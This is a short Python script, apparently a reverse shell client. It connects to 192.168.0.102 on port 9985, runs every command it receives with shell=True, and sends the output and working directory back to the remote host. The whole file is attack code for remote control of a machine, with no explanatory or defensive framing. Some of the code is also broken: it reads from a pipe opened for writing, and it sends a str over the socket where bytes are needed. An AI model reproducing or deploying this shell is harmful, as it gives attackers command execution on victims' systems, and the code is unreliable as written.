import socket
import os
import subprocess
import sys
s=socket.socket()
host='192.168.0.102'
port=9985
s.connect((host,port))


while True:
    data=s.recv(1024)
    if data[:2].decode('utf-8')=='cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data)>0:
        cmd=subprocess.Popen(data[:].decode('utf-8'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output_bytes=cmd.stdout.read()+cmd.stdin.read()+cmd.stderr.read()
        output_string=str(output_bytes,'utf-8')
        s.send(output_string + str(os.getcwd()))



s.close()